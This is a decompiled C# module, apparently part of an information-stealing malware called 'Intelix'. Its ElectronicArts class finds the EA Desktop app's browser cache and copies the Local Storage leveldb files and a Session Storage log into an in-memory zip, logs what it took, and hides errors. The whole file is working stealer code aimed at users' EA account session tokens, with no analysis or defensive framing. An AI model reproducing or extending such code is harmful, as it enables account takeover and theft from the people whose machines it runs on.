using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Games
{
	// Token: 0x02000024 RID: 36
	public class ElectronicArts : ITarget
	{
		// Token: 0x0600006B RID: 107 RVA: 0x00004EA0 File Offset: 0x000030A0
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Electronic Arts", "EA Desktop", "CEF");
			bool flag = !Directory.Exists(text);
			if (!flag)
			{
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "Electronic Arts";
				int num = 0;
				string path = Path.Combine(new string[]
				{
					text,
					"BrowserCache",
					"EADesktop",
					"Local Storage",
					"leveldb"
				});
				bool flag2 = Directory.Exists(path);
				if (flag2)
				{
					string[] files = Directory.GetFiles(path);
					foreach (string text2 in files)
					{
						try
						{
							bool flag3 = string.Equals(Path.GetExtension(text2), ".ldb", StringComparison.OrdinalIgnoreCase);
							if (flag3)
							{
								string text3 = "Electronic Arts\\leveldb\\" + Path.GetFileName(text2);
								zip.AddFile(text3, File.ReadAllBytes(text2));
								counterApplications.Files.Add(text2 + " => " + text3);
								num++;
							}
						}
						catch
						{
						}
					}
				}
				string text4 = Path.Combine(new string[]
				{
					text,
					"BrowserCache",
					"EADesktop",
					"Session Storage",
					"000003.log"
				});
				bool flag4 = File.Exists(text4);
				if (flag4)
				{
					try
					{
						string text5 = "Electronic Arts\\Session Storage\\000003.log";
						zip.AddFile(text5, File.ReadAllBytes(text4));
						counterApplications.Files.Add(text4 + " => " + text5);
						num++;
					}
					catch
					{
					}
				}
				bool flag5 = num != 0;
				if (flag5)
				{
					counterApplications.Files.Add("Electronic Arts\\");
					counter.Games.Add(counterApplications);
				}
			}
		}
	}
}
